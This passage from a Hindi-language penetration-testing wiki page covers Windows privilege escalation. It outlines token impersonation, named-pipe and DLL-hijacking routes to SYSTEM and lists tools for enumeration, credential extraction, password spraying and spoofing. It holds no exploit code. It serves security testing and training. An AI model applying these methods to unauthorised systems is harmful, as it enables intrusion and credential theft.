इस technique का उपयोग आमतौर पर **SYSTEM के रूप में चल रहे किसी process को चुना जाता है जिसमें सभी token privileges हों** (_हाँ, आप SYSTEM processes बिना सभी token privileges के भी पाएँगे_).\
**आप एक** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)** पा सकते हैं।**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। यह तकनीक **pipe create करने और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करने** पर आधारित है। फिर, वह **server** जिसने pipe बनाया है और जिसके पास **`SeImpersonate`** privilege है, वह pipe क्लाइंट (service) के token को **impersonate** कर सकता है और SYSTEM privileges हासिल कर सकता है.\
यदि आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation).\
यदि आप यह जानना चाहते हैं कि [**high integrity से System तक name pipes का उपयोग करके कैसे जाएँ**](from-high-integrity-to-system-with-name-pipes.md) तो यह example पढ़ें।

### Dll Hijacking

यदि आप किसी **dll** को hijack कर लेते हैं जिसे **SYSTEM के रूप में चल रहे किसी process** द्वारा load किया जा रहा है, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस प्रकार की privilege escalation के लिए उपयोगी है, और साथ ही यह high integrity process से हासिल करना **बहुत आसान** है क्योंकि उस प्रक्रिया के पास dlls लोड करने के लिए उपयोग की जाने वाली फ़ोल्डरों पर **write permissions** होते हैं.\
**आप** [**Dll hijacking के बारे में और जान सकते हैं यहाँ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और संवेदनशील फाइलों की जाँच के लिए (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करने के लिए (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session information निकालता है। लोकल में -Thorough प्रयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए passwords को domain पर spray करने के लिए**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजने के लिए (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना आवश्यक) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- host की enumeration करता है और misconfigurations खोजता है (ज़्यादा जानकारी इकट्ठा करने वाला टूल; compile करना आवश्यक) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials استخراج करता है (github पर precompiled exe मौजूद है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration जांचने के लिए (executable github पर precompiled). सिफारिश नहीं की जाती। Win10 पर अच्छा काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe). सिफारिश नहीं की जाती। Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया टूल (इसमें accesschk की आवश्यकता नहीं होती पर यह इसे उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही .NET version का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). किसी victim host पर इंस्टॉल की गई .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
